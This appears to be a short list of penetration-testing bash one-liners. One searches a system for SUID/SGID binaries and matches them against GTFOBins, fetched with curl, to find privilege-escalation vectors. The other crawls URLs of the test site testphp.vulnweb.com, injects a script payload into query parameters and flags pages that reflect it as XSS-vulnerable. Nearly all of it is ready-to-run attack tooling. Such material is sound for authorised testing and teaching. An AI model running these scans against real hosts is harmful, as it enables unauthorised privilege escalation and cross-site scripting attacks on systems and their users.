Oneliner for searching SUID/SGID binaries, filtered and correlated with GTFOBins to identify privilege escalation vectors.
```bash
find / -perm /6000 -type f 2>/dev/null | awk 'BEGIN{while(( "curl -s https://gtfobins.github.io/"|getline l)>0){if(match(l,/\/gtfobins\/([^\/]+)\//,m))g[m[1]]=1}close("curl -s https://gtfobins.github.io/")} {p=$0;n=p;sub(/^.*\//,"",n);if(n in g)print "[MATCH] "p}' | tree --fromfile -C
```

Oneliner for searching XSS Poc #1
```bash
domain="testphp.vulnweb.com" && payload="<script>confirm('xss')</script>" && gauu "$domain" --threads 5 | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "$payload" | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "$payload" && echo -e "$host \033[0;31mVulnerable"; done
```
